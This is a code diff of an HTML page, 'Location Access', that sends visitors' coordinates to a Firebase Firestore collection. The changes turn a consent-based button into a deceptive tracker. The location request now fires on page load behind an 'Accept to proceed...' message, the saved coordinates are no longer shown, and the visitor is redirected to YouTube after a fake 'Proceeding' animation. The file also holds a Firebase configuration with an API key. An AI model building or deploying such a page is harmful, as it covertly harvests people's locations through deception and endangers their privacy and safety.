@@ -5,12 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Access</title>
 
-    <!-- ✅ Correct Firebase SDK for Vanilla JS (Non-Module) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.4.0/firebase-firestore-compat.js"></script>
 
+    <style>
+        #message {
+            font-size: 20px;
+            font-weight: bold;
+        }
+    </style>
+
     <script>
-        // ✅ Firebase Configuration
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzAsyA7ZBuy7n4TvS1XmwmQpIwreTq35iyHQ4E",
             authDomain: "testing-76308.firebaseapp.com",
@@ -21,11 +28,11 @@
             measurementId: "G-SVCB4Z4V2"
         };
 
-        // ✅ Initialize Firebase (Must be inside script after SDK loads)
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // ✅ Function to send location data to Firestore
+        // Function to send location data to Firestore
         function sendLocation(latitude, longitude) {
             db.collection("locations").add({
                 latitude: latitude,
@@ -34,16 +41,17 @@
             })
             .then(() => {
                 console.log("Location saved successfully!");
-                document.getElementById("location").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                showProceedingAnimation();
             })
             .catch((error) => {
                 console.error("Error saving location:", error);
-                document.getElementById("location").innerText = "Failed to save location.";
+                document.getElementById("message").innerText = "Failed to save location.";
             });
         }
 
-        // ✅ Function to request user location
+        // Function to request user location
         function requestLocation() {
+            document.getElementById("message").innerText = "Accept to proceed...";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -51,19 +59,34 @@
                     },
                     (error) => {
                         console.error("Error getting location:", error);
-                        document.getElementById("location").innerText = "Location access denied.";
+                        document.getElementById("message").innerText = "Location access denied.";
                     }
                 );
             } else {
                 alert("Geolocation is not supported by your browser.");
             }
         }
-    </script>
 
+        // Function to show proceeding animation and redirect to YouTube
+        function showProceedingAnimation() {
+            let messageElement = document.getElementById("message");
+            let count = 0;
+            let interval = setInterval(() => {
+                count++;
+                messageElement.innerText = "Proceeding" + ".".repeat(count % 4);
+                if (count >= 6) { // Show animation for about 2-3 times
+                    clearInterval(interval);
+                    window.location.href = "https://www.youtube.com";
+                }
+            }, 500);
+        }
+
+        // Automatically request location on page load
+        window.onload = requestLocation;
+    </script>
 </head>
 <body>
     <h2>Your Location:</h2>
-    <p id="location">Click the button to share your location.</p>
-    <button onclick="requestLocation()">Send My Location</button>
+    <p id="message">Loading...</p>
 </body>
 </html>
